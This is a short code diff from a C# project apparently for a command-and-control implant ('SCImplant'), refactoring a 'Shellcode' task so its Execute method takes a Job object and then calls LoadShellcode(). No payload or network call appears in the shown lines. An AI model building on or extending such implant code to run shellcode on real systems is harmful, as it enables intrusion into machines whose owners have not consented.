@@ -1,12 +1,14 @@
 ﻿using System;
 using System.Runtime.InteropServices;
+using SaltedCaramel.Jobs;
 
 namespace SaltedCaramel.Tasks
 {
     public class Shellcode
     {
-        public static void Execute(SCTask task, SCImplant agent)
+        public static void Execute(Job job, SCImplant agent)
         {
+            SCTask task = job.Task;
             if(LoadShellcode())
             {
                 task.status = "complete";
